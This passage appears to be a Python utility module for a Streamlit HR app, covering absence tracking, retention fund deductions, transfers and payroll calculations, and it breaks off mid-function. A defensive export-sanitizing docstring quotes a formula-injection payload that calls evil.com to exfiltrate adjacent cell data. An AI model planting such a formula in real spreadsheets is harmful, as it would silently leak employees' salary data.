"""
Shared utility functions for the HR Assistant app.
Keeping all business-logic / calculation functions here (instead of inside
each page) makes the app easier to maintain and test.
"""

import io
import os
import json
from datetime import date, datetime
import pandas as pd
import streamlit as st


# --------------------------------------------------------------------------
# Navigation helpers
# --------------------------------------------------------------------------

def hide_default_sidebar_nav():
    """Hides Streamlit's automatic multipage sidebar list, so navigation is
    driven entirely by the nav cards / nav bar we render ourselves."""
    st.markdown(
        """
        <style>
        [data-testid="stSidebarNav"] {display: none;}
        </style>
        """,
        unsafe_allow_html=True,
    )


# NOTE: keep this in sync with the actual files under pages/. Every entry
# here becomes a st.page_link() call in render_top_nav() below - an entry
# pointing at a file that doesn't exist will raise an error, and an active
# page missing from this list simply won't get a nav link.
PAGES = [
    {"path": "pages/0_Login.py", "label": "Login", "icon": "🔐"},
    {"path": "Home.py", "label": "Home", "icon": "🗂️"},
    {"path": "pages/1_Long_Absence_Tracker.py", "label": "Long Absence Tracker", "icon": "📅"},
    {"path": "pages/2_Retention_Fund.py", "label": "Retention Fund", "icon": "💰"},
    {"path": "pages/3_Payroll_Calculator.py", "label": "Payroll Calculator", "icon": "🧾"},
    {"path": "pages/4_Employee_Database.py", "label": "Employee Database", "icon": "👥"},
    {"path": "pages/7_Shift_management.py", "label": "Shift Management", "icon": "🕒"},
]


def render_top_nav(active_label: str):
    """Renders a simple horizontal row of page links at the top of a page,
    used instead of the default sidebar navigation list.

    This now also shows a small user status area on the right with a logout
    button when the user is logged in."""
    hide_default_sidebar_nav()
    # extra column at the end reserved for user status / logout
    cols = st.columns(len(PAGES) + 1)
    for col, page in zip(cols[:-1], PAGES):
        with col:
            if page["label"] == active_label:
                st.markdown(f"**{page['icon']} {page['label']}**")
            else:
                st.page_link(page["path"], label=page["label"], icon=page["icon"])

    # right-most column: user status and logout
    with cols[-1]:
        if st.session_state.get("logged_in"):
            user = st.session_state.get("user")
            st.markdown(f"**👤 {user}**")
            if st.button("Logout"):
                # clear login-related session state keys (preserve app data)
                for k in ["logged_in", "user", "role"]:
                    if k in st.session_state:
                        del st.session_state[k]
                st.experimental_rerun()
        else:
            st.markdown("Not logged in")

    st.divider()


# --------------------------------------------------------------------------
# Generic helpers
# --------------------------------------------------------------------------

def read_any_table(uploaded_file) -> pd.DataFrame:
    """Read an uploaded .csv / .xlsx / .xls file, always treating the first
    row as the header row. Returns a cleaned DataFrame (strips whitespace
    from column names)."""
    if uploaded_file is None:
        return pd.DataFrame()

    name = uploaded_file.name.lower()
    if name.endswith(".csv"):
        df = pd.read_csv(uploaded_file, header=0)
    else:
        df = pd.read_excel(uploaded_file, header=0, engine="openpyxl")

    df.columns = [str(c).strip() for c in df.columns]
    return df


def to_excel_bytes(sheets: dict) -> bytes:
    """Convert a dict of {sheet_name: DataFrame} into an in-memory .xlsx file
    and return the raw bytes, ready for st.download_button.

    Every sheet is passed through `sanitize_dataframe_for_export()` first so
    that no exported file can carry a formula-injection payload (a common
    way sensitive data gets silently exfiltrated when a report is later
    re-opened in Excel/Sheets by someone else)."""
    buffer = io.BytesIO()
    with pd.ExcelWriter(buffer, engine="xlsxwriter") as writer:
        for sheet_name, df in sheets.items():
            safe_name = str(sheet_name)[:31]  # Excel sheet name limit
            sanitize_dataframe_for_export(df).to_excel(writer, index=False, sheet_name=safe_name)
    return buffer.getvalue()


def download_button_for_df(df: pd.DataFrame, label: str, file_name: str, key: str = None):
    st.download_button(
        label=label,
        data=to_excel_bytes({"Sheet1": df}),
        file_name=file_name,
        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        key=key,
    )


# --------------------------------------------------------------------------
# Data-leak / security hardening
# --------------------------------------------------------------------------

_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")


def sanitize_dataframe_for_export(df: pd.DataFrame) -> pd.DataFrame:
    """Neutralizes CSV/Excel formula-injection payloads before any data
    leaves the app as a downloadable file.

    If a cell value (typically from an uploaded sheet) starts with =, +, -,
    or @, Excel/Sheets will treat it as a formula when the exported file is
    reopened. A malicious cell like `=HYPERLINK("http://evil.com/"&A1,"x")`
    can silently exfiltrate adjacent salary data the moment someone opens
    the report. Prefixing such cells with a leading apostrophe forces them
    to render as plain text instead of executing.

    This only rewrites string cells that start with a trigger character —
    numbers, dates, and normal text are left untouched.
    """
    out = df.copy()
    for col in out.columns:
        if pd.api.types.is_object_dtype(out[col]) or pd.api.types.is_string_dtype(out[col]):
            out[col] = out[col].apply(
                lambda v: ("'" + v) if isinstance(v, str) and v.startswith(_FORMULA_TRIGGER_CHARS) else v
            )
    return out


def safe_error_message(exc: Exception, context: str = "processing your data") -> str:
    """Returns a generic, user-facing error message that never echoes raw
    exception text back into the UI. Exception messages can accidentally
    contain fragments of the underlying data (e.g. a bad cell value quoted
    inside a pandas/KeyError message) — showing that verbatim in st.error
    is itself a small data leak. Log `exc` server-side via your own logging
    setup if you need the details; don't display it to end users.
    """
    return f"⚠️ Something went wrong while {context}. Please check your file's columns and format and try again."


SENSITIVE_SESSION_KEYS = [
    "employee_db",
    "fulltime_data",
    "payroll_result",
    "gig_data",
    "gig_result",
    "retention_fund_data",
    "retention_result",
    "internal_transfers",
]


def clear_sensitive_session_data():
    """Wipes all cached salary/employee data out of session_state. Streamlit
    keeps session_state in server memory for as long as the browser tab's
    session is alive — calling this lets you deliberately purge sensitive
    payroll data once you're done with it, rather than leaving it sitting
    in memory (e.g. on a shared workstation)."""
    for key in SENSITIVE_SESSION_KEYS:
        if key in st.session_state:
            del st.session_state[key]


def render_clear_data_button(label: str = "🔒 Clear cached data from this session"):
    if st.button(label):
        clear_sensitive_session_data()
        st.success("Session data cleared.")
        st.rerun()


# --------------------------------------------------------------------------
# 1. Long Absence Tracking
# --------------------------------------------------------------------------

def sample_attendance_muster() -> pd.DataFrame:
    """Small example attendance muster for download, showing the expected
    shape: employee identifier columns first (Employee ID, Employee Name,
    Branch), followed by one column per day with attendance marks
    (P=Present, A=Absent, WO=Weekly Off, L=Leave).

    This mirrors the row/column layout the Long Absence Tracker page
    expects — copy this shape when preparing your real muster."""
    days = [f"Day{i}" for i in range(1, 11)]

    rows = [
        {
            "Employee ID": "E001",
            "Employee Name": "Ravi Kumar",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "A", "P", "P", "WO", "P", "A", "P", "P"])),
        },
        {
            "Employee ID": "E002",
            "Employee Name": "Sita Sharma",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "P", "P", "P", "WO", "P", "P", "P", "P"])),
        },
        {
            "Employee ID": "E003",
            "Employee Name": "Mohan Das",
            "Branch": "Whitefield",
            **dict(zip(days, ["A", "A", "A", "A", "A", "WO", "A", "A", "A", "A"])),
        },
    ]
    return pd.DataFrame(rows)


def count_absences(df: pd.DataFrame, id_cols: list, absence_marker: str = "A") -> pd.DataFrame:
    """Given an attendance muster where `id_cols` identify the employee and
    all other columns are day-wise attendance marks, count how many times
    `absence_marker` (default 'A') appears for each employee.

    Also captures the columns that could not be counted (in case some
    non-date extra columns sneak in) — but by default we just count on
    every non-id column, so make sure the caller has picked id_cols
    correctly.
    """
    day_cols = [c for c in df.columns if c not in id_cols]

    def count_row(row):
        vals = row[day_cols].astype(str).str.strip().str.upper()
        return (vals == absence_marker.upper()).sum()

    result = df[id_cols].copy()
    result["Total_Absent_Days"] = df.apply(count_row, axis=1)
    result["Total_Days_In_Muster"] = len(day_cols)
    return result


def categorize_absences(df: pd.DataFrame, thresholds: list) -> pd.DataFrame:
    """thresholds: list of (label, min_days, max_days_or_None) tuples,
    evaluated in order. max_days_or_None means "and above".
    Adds a 'Absence_Category' column to df (based on Total_Absent_Days).
    """

    def classify(days):
        for label, min_d, max_d in thresholds:
            if max_d is None:
                if days >= min_d:
                    return label
            else:
                if min_d <= days <= max_d:
                    return label
        return "Not Flagged"

    out = df.copy()
    out["Absence_Category"] = out["Total_Absent_Days"].apply(classify)
    return out


DEFAULT_ABSENCE_THRESHOLDS = [
    ("Informed Leave (3-4 days)", 3, 4),
    ("To Be Checked (5-20 days)", 5, 20),
    ("Probable Exit Case (>20 days)", 21, None),
]


# --------------------------------------------------------------------------
# 2. Retention Fund Tracking
# --------------------------------------------------------------------------

# Company codes ignored (excluded) from retention fund deduction. Stored as
# a small JSON file (same `data/` folder used for users.json /
# pending_requests.json) so the list is a persistent, admin-managed setting
# rather than something reset every browser session. IGNITE ships as the
# default ignored code to match the original hard-coded behaviour.
DEFAULT_IGNORED_COMPANY_CODES = ["IGNITE"]

_APP_ROOT = os.path.dirname(os.path.abspath(__file__))
_DATA_DIR = os.path.join(_APP_ROOT, "..", "data")
_IGNORED_CC_FILE = os.path.join(_DATA_DIR, "ignored_company_codes.json")


def load_ignored_company_codes() -> list:
    """Returns the current list of Company Codes to exclude from retention
    fund deduction. Falls back to DEFAULT_IGNORED_COMPANY_CODES if the file
    doesn't exist yet or can't be parsed."""
    if not os.path.exists(_IGNORED_CC_FILE):
        return list(DEFAULT_IGNORED_COMPANY_CODES)
    try:
        with open(_IGNORED_CC_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list) and all(isinstance(c, str) for c in data):
            return data
    except Exception:
        pass
    return list(DEFAULT_IGNORED_COMPANY_CODES)


def save_ignored_company_codes(codes: list):
    """Persists the ignored-company-codes list (deduplicated, uppercased,
    sorted for a stable display order)."""
    os.makedirs(_DATA_DIR, exist_ok=True)
    clean = sorted({str(c).strip().upper() for c in codes if str(c).strip()})
    with open(_IGNORED_CC_FILE, "w", encoding="utf-8") as f:
        json.dump(clean, f, indent=2)


# --------------------------------------------------------------------------
# Payroll cycle (26th of a month -> 25th of the next) & New Joiner tagging
# --------------------------------------------------------------------------

def get_payroll_cycle(reference_date=None) -> tuple:
    """Returns (cycle_start, cycle_end) as date objects for the payroll
    cycle containing `reference_date` (defaults to today). The payroll
    cycle always runs from the 26th of a month through the 25th of the
    following month, regardless of which year/month `reference_date` falls
    in — so this stays correct across month/year boundaries without ever
    needing a hard-coded cycle."""
    if reference_date is None:
        reference_date = date.today()
    if isinstance(reference_date, datetime):
        reference_date = reference_date.date()

    if reference_date.day >= 26:
        cycle_start = date(reference_date.year, reference_date.month, 26)
        end_month = reference_date.month + 1
        end_year = reference_date.year
        if end_month > 12:
            end_month = 1
            end_year += 1
        cycle_end = date(end_year, end_month, 25)
    else:
        start_month = reference_date.month - 1
        start_year = reference_date.year
        if start_month < 1:
            start_month = 12
            start_year -= 1
        cycle_start = date(start_year, start_month, 26)
        cycle_end = date(reference_date.year, reference_date.month, 25)

    return cycle_start, cycle_end


def tag_new_joiners(df: pd.DataFrame, joining_col: str, cycle_start, cycle_end) -> pd.DataFrame:
    """Adds a boolean 'New Joiner' column: True when the employee's Joining
    Date falls inside [cycle_start, cycle_end] — the payroll cycle being
    processed (26th of a month to 25th of the next).

    Retention fund deduction is meant to be triggered only for employees
    who are new joiners in the cycle being processed: existing employees
    were already deducted in an earlier cycle's run and shouldn't have the
    deduction re-applied every time the master sheet is re-uploaded.
    """
    out = df.copy()
    joining_dt = pd.to_datetime(out[joining_col], errors="coerce")
    cycle_start_ts = pd.Timestamp(cycle_start)
    cycle_end_ts = pd.Timestamp(cycle_end)
    out["New Joiner"] = (joining_dt >= cycle_start_ts) & (joining_dt <= cycle_end_ts)
    return out


def format_date_ddmmmyyyy(value) -> str:
    """Formats a date/datetime/parsable string as dd-mmm-yyyy, e.g.
    '08-Sep-2026'. Returns '' for null/unparseable values rather than
    raising, since this is purely a display helper."""
    if value is None:
        return ""
    try:
        if isinstance(value, float) and pd.isna(value):
            return ""
        dt_value = pd.to_datetime(value)
        if pd.isna(dt_value):
            return ""
        return dt_value.strftime("%d-%b-%Y")
    except Exception:
        return ""


def pending_deduction_sentence(label: str, pending_df: pd.DataFrame, name_col: str) -> str:
    """Turns a group of pending-release records into a readable sentence,
    e.g. 'MAIN: 3 deductions pending.', 'IGNITE: No deductions pending.', or
    'Whitefield: 1 deduction pending with employee Ravi Kumar.' when there's
    exactly one (naming the employee since there's only one to name).
    Handles singular/plural grammar automatically."""
    count = len(pending_df)
    if count == 0:
        return f"**{label}**: No deductions pending."
    if count == 1:
        emp_name = pending_df.iloc[0][name_col] if name_col in pending_df.columns else "employee"
        return f"**{label}**: 1 deduction pending with employee {emp_name}."
    return f"**{label}**: {count} deductions pending."


def sample_employee_master_for_retention() -> pd.DataFrame:
    """Sample employee master sheet for retention fund tracking.
    
    Columns: ERP, Name, Joining Date, Company Code (CC), Branch, 
    Gross Salary
    """
    return pd.DataFrame([
        {
            "ERP": "E001",
            "Name": "Ravi Kumar",
            "Joining Date": "2020-01-15",
            "Company Code": "IGNITE",
            "Branch": "Koramangala",
            "Gross Salary": 25000.00,
        },
        {
            "ERP": "E002",
            "Name": "Sita Sharma",
            "Joining Date": "2021-06-10",
            "Company Code": "MAIN",
            "Branch": "Koramangala",
            "Gross Salary": 35000.00,
        },
        {
            "ERP": "E003",
            "Name": "Mohan Das",
            "Joining Date": "2019-03-20",
            "Company Code": "MAIN",
            "Branch": "Whitefield",
            "Gross Salary": 40000.00,
        },
    ])


def sample_internal_transfer_template() -> pd.DataFrame:
    """Sample internal transfer data for retention fund tracking.
    
    Columns: ERP, Name, Old Branch, Old Branch CC, New Branch, New Branch CC, 
    Gross Change Amount
    """
    return pd.DataFrame([
        {
            "ERP": "E001",
            "Name": "Ravi Kumar",
            "Old Branch": "Koramangala",
            "Old Branch CC": "MAIN",
            "New Branch": "Whitefield",
            "New Branch CC": "MAIN",
            "Gross Change Amount": 0.00,
        },
        {
            "ERP": "E002",
            "Name": "Sita Sharma",
            "Old Branch": "Koramangala",
            "Old Branch CC": "MAIN",
            "New Branch": "Bangalore",
            "New Branch CC": "IGNITE",
            "Gross Change Amount": 5000.00,
        },
        {
            "ERP": "E003",
            "Name": "Mohan Das",
            "Old Branch": "Whitefield",
            "Old Branch CC": "MAIN",
            "New Branch": "Koramangala",
            "New Branch CC": "MAIN",
            "Gross Change Amount": -2000.00,
        },
    ])


def compute_retention_fund_deduction(
    df: pd.DataFrame,
    erp_col: str,
    name_col: str,
    cc_col: str,
    branch_col: str,
    salary_col: str,
    deduction_pct: float = 10.0,
    ignored_company_codes: list = None,
    new_joiner_only: bool = False,
    new_joiner_col: str = "New Joiner",
) -> pd.DataFrame:
    """Compute retention fund deduction on earned gross salary.
    
    Args:
        df: Employee master DataFrame
        erp_col: Column name for ERP ID
        name_col: Column name for employee name
        cc_col: Column name for company code (CC)
        branch_col: Column name for branch
        salary_col: Column name for gross salary
        deduction_pct: Deduction percentage (default 10%)
        ignored_company_codes: Company codes to exclude from deduction
            entirely (case-insensitive). Pass the list from
            load_ignored_company_codes() to respect the admin-managed
            ignore list. None / empty list applies deduction to everyone.
        new_joiner_only: If True, deduction is applied only to rows where
            `new_joiner_col` is True — i.e. only employees who are new
            joiners in the payroll cycle being processed. Use
            tag_new_joiners() to add that column before calling this with
            new_joiner_only=True. Existing employees (already deducted in
            an earlier cycle) are left with no deduction this run.
        new_joiner_col: Name of the boolean "is a new joiner" column to
            check when new_joiner_only=True.
    
    Returns:
        DataFrame with retention fund calculations
    """
    out = df.copy()
    
    # Coerce salary column to numeric
    out[salary_col] = coerce_numeric_column(out[salary_col], salary_col)
    
    # Determine if deduction applies (anyone in the ignore list is excluded)
    ignored_upper = {str(c).strip().upper() for c in (ignored_company_codes or []) if str(c).strip()}
    if ignored_upper:
        applicable = ~out[cc_col].astype(str).str.upper().isin(ignored_upper)
    else:
        applicable = pd.Series(True, index=out.index)

    if new_joiner_only:
        if new_joiner_col not in out.columns:
            raise ValueError(
                f"Column '{new_joiner_col}' not found. Call tag_new_joiners() to add it "
                "before computing deduction with new_joiner_only=True."
            )
        applicable = applicable & out[new_joiner_col].astype(bool)

    out["Deduction Applicable"] = applicable
    
    # Calculate deduction amount (only where applicable)
    out["Deduction Amount"] = 0.0
    out.loc[out["Deduction Applicable"], "Deduction Amount"] = (
        out.loc[out["Deduction Applicable"], salary_col] * deduction_pct / 100
    )
    
    # Calculate accumulated amount (can be summed over multiple months)
    out["Amount After Deduction"] = out[salary_col] - out["Deduction Amount"]
    
    return out


def categorize_retention_status(df: pd.DataFrame) -> pd.DataFrame:
    """Categorize retention fund status for each employee.
    
    Returns DataFrame with additional 'Status' column indicating:
    - No Deduction: Deduction not applicable
    - Pending Release: Has accumulated deduction pending release
    """
    out = df.copy()
    
    def get_status(row):
        if not row.get("Deduction Applicable", False):
            return "No Deduction"
        deduction = row.get("Deduction Amount", 0)
        if deduction > 0:
            return "Pending Release"
        return "Not Applicable"
    
    out["Status"] = out.apply(get_status, axis=1)
    return out


def filter_by_company_code(df: pd.DataFrame, cc_col: str, company_codes: list) -> pd.DataFrame:
    """Filter employee data by company codes.
    
    Args:
        df: Employee DataFrame
        cc_col: Column name for company code
        company_codes: List of company codes to include
    
    Returns:
        Filtered DataFrame
    """
    if not company_codes:
        return df
    return df[df[cc_col].astype(str).str.upper().isin([cc.upper() for cc in company_codes])]


def filter_by_branch(df: pd.DataFrame, branch_col: str, branches: list) -> pd.DataFrame:
    """Filter employee data by branches.
    
    Args:
        df: Employee DataFrame
        branch_col: Column name for branch
        branches: List of branches to include
    
    Returns:
        Filtered DataFrame
    """
    if not branches:
        return df
    return df[df[branch_col].astype(str).str.upper().isin([b.upper() for b in branches])]


def merge_internal_transfers(
    retention_df: pd.DataFrame,
    transfers_df: pd.DataFrame,
    erp_col: str,
    old_cc_col: str,
    new_cc_col: str,
) -> pd.DataFrame:
    """Merge retention fund data with internal transfer data.
    
    Updates company code for transferred employees and tracks old CC info.
    
    Args:
        retention_df: Retention fund DataFrame
        transfers_df: Internal transfer DataFrame
        erp_col: Column name for ERP ID
        old_cc_col: Column name for old company code in transfers
        new_cc_col: Column name for new company code in transfers
    
    Returns:
        Updated retention DataFrame with transfer information
    """
    out = retention_df.copy()
    
    # Add columns to track transfers
    out["Transferred"] = False
    out["Previous CC"] = out.get("Company Code", "")
    
    # Merge transfer information
    transfer_map = {}
    for _, row in transfers_df.iterrows():
        erp = row.get(erp_col)
        transfer_map[erp] = {
            "old_cc": row.get(old_cc_col),
            "new_cc": row.get(new_cc_col),
        }
    
    # Update company codes for transferred employees
    for idx, row in out.iterrows():
        erp = row.get(erp_col)
        if erp in transfer_map:
            transfer_info = transfer_map[erp]
            out.at[idx, "Previous CC"] = transfer_info["old_cc"]
            out.at[idx, "Company Code"] = transfer_info["new_cc"]
            out.at[idx, "Transferred"] = True
    
    return out


def sample_erp_transfer_template() -> pd.DataFrame:
    """Sample data for tracking employees who were issued a NEW ERP ID after
    an internal branch/company-code transfer.

    Use this (rather than sample_internal_transfer_template, which assumes
    the ERP stays the same) whenever the employee's ERP itself changes on
    transfer — any retention fund deduction still pending release under the
    Old ERP needs to move to the New ERP so the eventual release happens
    against the employee's current identity.
    """
    return pd.DataFrame([
        {
            "Old ERP": "E001",
            "New ERP": "E101",
            "Name": "Ravi Kumar",
            "Old Branch": "Koramangala",
            "New Branch": "Whitefield",
            "Old Company Code": "MAIN",
            "New Company Code": "MAIN",
        },
        {
            "Old ERP": "E002",
            "New ERP": "E102",
            "Name": "Sita Sharma",
            "Old Branch": "Koramangala",
            "New Branch": "Bangalore",
            "Old Company Code": "MAIN",
            "New Company Code": "IGNITE",
        },
    ])


def apply_internal_transfers(
    result_df: pd.DataFrame,
    transfers_df: pd.DataFrame,
    erp_col: str,
    old_erp_col: str,
    new_erp_col: str,
    branch_col: str = None,
    new_branch_col: str = None,
    cc_col: str = None,
    new_cc_col: str = None,
) -> pd.DataFrame:
    """Applies an Old-ERP -> New-ERP transfer mapping to a retention fund
    result table.

    For every transfer row, any record in `result_df` whose ERP matches the
    Old ERP has its ERP swapped to the New ERP. The original ERP is kept in
    a 'Previous ERP' column for audit purposes, and a 'Transferred' flag is
    set. When supplied and present in the transfer sheet, Branch / Company
    Code are updated to the new values too.

    This is what makes a deduction that is still 'Pending Release' follow
    the employee to their new ERP: every downstream view (pending-release
    list, dashboard, exports) reads off `result_df[erp_col]`, so once this
    runs, the New ERP — not the old one — is what shows up, and is what the
    eventual release gets paid out against.

    Rows in `result_df` whose ERP does not appear in the Old ERP column are
    left completely untouched.
    """
    out = result_df.copy()

    if "Previous ERP" not in out.columns:
        out["Previous ERP"] = None
    if "Transferred" not in out.columns:
        out["Transferred"] = False

    out[erp_col] = out[erp_col].astype(str)

    for _, row in transfers_df.iterrows():
        old_erp = str(row.get(old_erp_col, "")).strip()
        new_erp = str(row.get(new_erp_col, "")).strip()
        if not old_erp or not new_erp:
            continue

        mask = out[erp_col] == old_erp
        if not mask.any():
            continue

        out.loc[mask, "Previous ERP"] = old_erp
        out.loc[mask, erp_col] = new_erp
        out.loc[mask, "Transferred"] = True

        if branch_col and new_branch_col and new_branch_col in transfers_df.columns:
            new_branch = row.get(new_branch_col)
            if pd.notna(new_branch) and str(new_branch).strip():
                out.loc[mask, branch_col] = new_branch

        if cc_col and new_cc_col and new_cc_col in transfers_df.columns:
            new_cc = row.get(new_cc_col)
            if pd.notna(new_cc) and str(new_cc).strip():
                out.loc[mask, cc_col] = new_cc

    return out


def generate_retention_report(
    df: pd.DataFrame,
    erp_col: str,
    name_col: str,
    cc_col: str,
    branch_col: str,
    deduction_col: str,
    status_col: str,
) -> dict:
    """Generate summary statistics for retention fund report.
    
    Returns:
        Dictionary with summary metrics
    """
    deductions = df[df[status_col] == "Pending Release"][deduction_col].sum()
    
    return {
        "Total Employees": len(df),
        "Employees with Deduction": (df[status_col] == "Pending Release").sum(),
        "Employees without Deduction": (df[status_col] == "No Deduction").sum(),
        "Total Accumulated Deduction": deductions,
        "Average Deduction per Employee": deductions / max((df[status_col] == "Pending Release").sum(), 1),
        "By Company Code": df.groupby(cc_col)[deduction_col].sum().to_dict(),
        "By Branch": df.groupby(branch_col)[deduction_col].sum().to_dict(),
    }


def process_internal_transfers(
    transfers_df: pd.DataFrame,
    erp_col: str,
    gross_change_col: str,
) -> pd.DataFrame:
    """Process internal transfer data and validate format.
    
    Args:
        transfers_df: Internal transfer DataFrame
        erp_col: Column name for ERP ID
        gross_change_col: Column name for gross change amount
    
    Returns:
        Processed transfer DataFrame with numeric columns coerced
    """
    out = transfers_df.copy()
    
    # Coerce gross change to numeric
    if gross_change_col in out.columns:
        out[gross_change_col] = pd.to_numeric(
            out[gross_change_col].astype(str).str.replace(r"[₹$,\s]", "", regex=True),
            errors="coerce"
        ).fillna(0)
    
    return out


# --------------------------------------------------------------------------
# 3. Payroll: Full-time employees (PF + ESIC) & Gig workers (TDS)
# --------------------------------------------------------------------------

def coerce_numeric_column(series: pd.Series, column_name: str = "value") -> pd.Series:
    """Cleans a column that should be numeric but may have been uploaded as
    text — a very common real-world case: Excel cells formatted as Text,
    numbers with thousands separators ('15,000'), or a currency symbol
    ('₹15,000'). Strips ₹/$/commas/whitespace, then converts.

    Raises a ValueError naming exactly which rows couldn't be parsed (with
    up to 5 examples), instead of letting a cryptic TypeError surface deep
    inside a downstream calculation. Blank/NaN cells are left as NaN — a
    missing value isn't a formatting error, and callers can decide how to
    handle it (e.g. warn and skip that row) rather than have this function
    force a decision.
    """
    if pd.api.types.is_numeric_dtype(series):
        return series

    cleaned = series.astype(str).str.replace(r"[₹$,\s]", "", regex=True).str.strip()
    cleaned = cleaned.replace({"": None, "nan": None, "None": None, "NaT": None})
    numeric = pd.to_numeric(cleaned, errors="coerce")

    bad_mask = numeric.isna() & series.notna()
    if bad_mask.any():
        bad_rows = series[bad_mask]
        examples = ", ".join(f"row {i + 2}: '{v}'" for i, v in bad_rows.head(5).items())
        more = f" (+{bad_mask.sum() - 5} more)" if bad_mask.sum() > 5 else ""
        raise ValueError(
            f"Column '{column_name}' has {bad_mask.sum()} value(s) that aren't valid numbers "
            f"— e.g. {examples}{more}. Please fix these cells and re-upload."
        )
    return numeric


# --------------------------------------------------------------------------
# Sample templates for payroll bulk sections
# --------------------------------------------------------------------------

def sample_fulltime_payroll_template() -> pd.DataFrame:
    return pd.DataFrame([
        {"Employee ID": "E001", "Name": "Ravi Kumar", "Basic": 15000, "HRA": 2000, "Other Allowances": 500},
        {"Employee ID": "E002", "Name": "Sita Sharma", "Basic": 22000, "HRA": 3000, "Other Allowances": 0},
    ])


def sample_gig_billing_template() -> pd.DataFrame:
    return pd.DataFrame([
        {"Worker ID": "W001", "Name": "Arjun Das", "Payment Amount": 18000},
        {"Worker ID": "W002", "Name": "Meena Iyer", "Payment Amount": 22000},
    ])


def sample_gross_to_inhand_template() -> pd.DataFrame:
    return pd.DataFrame([
        {"Employee ID": "E001", "Name": "Ravi Kumar", "Gross Salary": 17500, "Fixed Allowances": 2000},
        {"Employee ID": "E002", "Name": "Sita Sharma", "Gross Salary": 25000, "Fixed Allowances": 3000},
    ])


def sample_inhand_to_gross_template() -> pd.DataFrame:
    return pd.DataFrame([
        {"Employee ID": "E001", "Name": "Ravi Kumar", "Desired In-Hand": 15000, "Fixed Allowances": 2000},
        {"Employee ID": "E002", "Name": "Sita Sharma", "Desired In-Hand": 21000, "Fixed Allowances": 3000},
    ])


def sample_gig_inhand_to_billing_template() -> pd.DataFrame:
    return pd.DataFrame([
        {"Worker ID": "W001", "Name": "Arjun Das", "In-Hand Amount": 18000},
        {"Worker ID": "W002", "Name": "Meena Iyer", "In-Hand Amount": 22000},
    ])


def sample_gig_billing_to_inhand_template() -> pd.DataFrame:
    return pd.DataFrame([
        {"Worker ID": "W001", "Name": "Arjun Das", "Billing Amount": 18180},
        {"Worker ID": "W002", "Name": "Meena Iyer", "Billing Amount": 22220},
    ])


def compute_fulltime_payroll(
    df: pd.DataFrame,
    basic_col: str,
    hra_col: str = None,
    other_allow_col: str = None,
    pf_wage_cap: float = 15000,
    apply_pf_cap: bool = True,
    pf_employee_pct: float = 12.0,
    pf_employer_pct: float = 12.0,
    esic_threshold: float = 21000,
    esic_employee_pct: float = 0.75,
    esic_employer_pct: float = 3.25,
) -> pd.DataFrame:
    """Computes Gross, PF (employee + employer) and ESIC (employee + employer)
    and Net Pay for full-time employees.

    Statutory notes (verify current rates before relying on this for actual
    payroll compliance — rates/thresholds can change):
      - PF: 12% of Basic (employee), 12% of Basic (employer), employee PF
        wage capped at ₹15,000/month by default (toggle-able).
      - ESIC: applicable only if Gross <= ₹21,000/month.
        Employee 0.75%, Employer 3.25% of Gross.
    """
    out = df.copy()

    out[basic_col] = coerce_numeric_column(out[basic_col], basic_col)
    if hra_col and hra_col in out.columns:
        out[hra_col] = coerce_numeric_column(out[hra_col], hra_col)
    if other_allow_col and other_allow_col in out.columns:
        out[other_allow_col] = coerce_numeric_column(out[other_allow_col], other_allow_col)

    hra = out[hra_col] if hra_col and hra_col in out.columns else 0
    other = out[other_allow_col] if other_allow_col and other_allow_col in out.columns else 0

    out["Gross Salary"] = out[basic_col] + hra + other

    pf_wage = out[basic_col].clip(upper=pf_wage_cap) if apply_pf_cap else out[basic_col]
    out["PF Wage"] = pf_wage
    out["PF (Employee)"] = pf_wage * pf_employee_pct / 100
    out["PF (Employer)"] = pf_wage * pf_employer_pct / 100

    esic_applicable = out["Gross Salary"] <= esic_threshold
    out["ESIC Applicable"] = esic_applicable
    out["ESIC (Employee)"] = 0.0
    out["ESIC (Employer)"] = 0.0
    out.loc[esic_applicable, "ESIC (Employee)"] = (
        out.loc[esic_applicable, "Gross Salary"] * esic_employee_pct / 100
    )
    out.loc[esic_applicable, "ESIC (Employer)"] = (
        out.loc[esic_applicable, "Gross Salary"] * esic_employer_pct / 100
    )

    out["Total Employee Deductions"] = out["PF (Employee)"] + out["ESIC (Employee)"]
    out["Net Pay (Employee Take-home)"] = out["Gross Salary"] - out["Total Employee Deductions"]
    out["Total Employer Cost (CTC add-on)"] = out["PF (Employer)"] + out["ESIC (Employer)"]

    return out


def compute_gig_worker_billing(
    df: pd.DataFrame,
    amount_col: str,
    tds_pct: float = 1.0,
) -> pd.DataFrame:
    """Gig / contract worker monthly billing:
        TDS Amount     = amount * tds_pct%
        Billing Amount = amount + TDS Amount   (TDS added on top per requirement)

    This matches the stated requirement: '1% TDS to be added as monthly
    billing amount'. If your actual policy instead grosses-up so the worker
    nets a fixed amount after TDS deduction, use amount / (1 - tds_pct/100)
    instead — flagged here as an assumption to confirm.
    """
    out = df.copy()
    out[amount_col] = coerce_numeric_column(out[amount_col], amount_col)
    out["TDS Amount"] = out[amount_col] * tds_pct / 100
    out["Monthly Billing Amount"] = out[amount_col] + out["TDS Amount"]
    return out


# --------------------------------------------------------------------------
# 4. Gross <-> In-Hand converters
# --------------------------------------------------------------------------

def solve_gross_for_net_fulltime(
    target_net: float,
    fixed_allowances: float = 0.0,
    pf_wage_cap: float = 15000,
    apply_pf_cap: bool = True,
    pf_employee_pct: float = 12.0,
    pf_employer_pct: float = 12.0,
    esic_threshold: float = 21000,
    esic_employee_pct: float = 0.75,
    esic_employer_pct: float = 3.25,
    tolerance: float = 1.0,
    max_iterations: int = 100,
) -> dict:
    """Reverse calculation: given a target monthly in-hand (net take-home)
    amount, finds the Basic Salary (and resulting Gross) that would produce
    it, using bisection search.

    This can't be solved with a plain formula because PF is capped at a
    wage ceiling and ESIC only applies below a gross threshold (₹21,000
    by default) — so Net(Gross) is a piecewise, not linear, function.
    Bisection works because Net(Gross) is monotonically non-decreasing
    (crossing the ESIC threshold only ever *removes* a deduction, which can
    only increase net pay, never decrease it).

    `fixed_allowances` = HRA + Other Allowances, treated as a fixed rupee
    amount added on top of Basic for Gross, but NOT subject to PF (only
    Basic is PF wage). Set to 0 if you want the entire amount to be Basic.
    """

    def net_for_basic(basic):
        df = pd.DataFrame([{"Basic": basic, "Other": fixed_allowances}])
        result = compute_fulltime_payroll(
